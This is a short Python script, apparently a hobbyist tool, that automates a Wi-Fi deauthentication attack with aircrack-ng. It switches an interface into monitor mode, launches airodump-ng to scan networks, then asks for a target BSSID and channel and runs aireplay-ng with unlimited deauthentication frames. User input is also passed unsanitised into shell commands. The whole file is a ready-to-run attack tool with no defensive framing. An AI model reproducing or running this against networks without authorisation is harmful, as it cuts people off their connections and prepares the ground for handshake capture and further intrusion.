import subprocess


WHITE = WHITE = '\033[97m'
GREEN = "\033[92m"
a=(WHITE + r""" 
     _    _        __        ___ _____ _ 
    / \  (_)_ __   \ \      / (_)  ___(_)
   / _ \ | | '__|___\ \ /\ / /| | |_  | |
  / ___ \| | | |_____\ V  V / | |  _| | |
 /_/   \_\_|_|        \_/\_/  |_|_|   |_|
                                         """)

simon=(GREEN + r"""
               _____  _____ __  __  ____  _   _ 
              / ____| _   _|  \/  |/ __ \| \ | |
              | (___   | | | \  / | |  | |  \| |
               \___ \  | | | |\/| | |  | | . ` |
               ____) |_| |_| |  | | |__| | |\  |
              |_____/|_____|_|  |_|\____/|_| \_|""")
print(a+simon)
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def get_interfaces():
    output = run_command("iw dev")
    interfaces = []
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            iface = line.split()[1]
            interfaces.append(iface)
    return interfaces

def select_interface(interfaces, prompt="\nSelect interface number: "):
    for i, iface in enumerate(interfaces):
        print(f"{i}) {iface}")
    index = int(input(prompt))
    return interfaces[index]

def start_airodump_in_new_terminal(interface):
    print('If you find the WiFi you want, use the Ctrl-C to Break and use its information.')
    subprocess.Popen(
        ['gnome-terminal', '--', 'bash', '-c', f'sudo airodump-ng {interface}; exec bash']
    )
    print(f"airodump-ng started in a new terminal on {interface}")

def set_channel(interface, channel):
    run_command(f"sudo airmon-ng start {interface} {channel}")
    print(f"Channel set to {channel} on {interface}")

def start_deauth_attack(interface, bssid):
    print("Starting deauth attack...")
    subprocess.run(f"sudo aireplay-ng -0 0 -a {bssid} {interface}", shell=True)

def main():
    interfaces = get_interfaces()
    if not interfaces:
        print("No interfaces found.")
        return

    iface = select_interface(interfaces)
    run_command(f"sudo airmon-ng start {iface}")

    interfaces = get_interfaces()
    if not interfaces:
        print("No interfaces found after enabling monitor mode.")
        return

    mon_iface = select_interface(interfaces, "Select interface to use with airodump-ng: ")
    start_airodump_in_new_terminal(mon_iface)

    
    bssid = input("Enter target BSSID: ").strip()
    channel = input("Enter target channel: ").strip()

    set_channel(mon_iface, channel)
    start_deauth_attack(mon_iface, bssid)

if __name__ == "__main__":
    main()
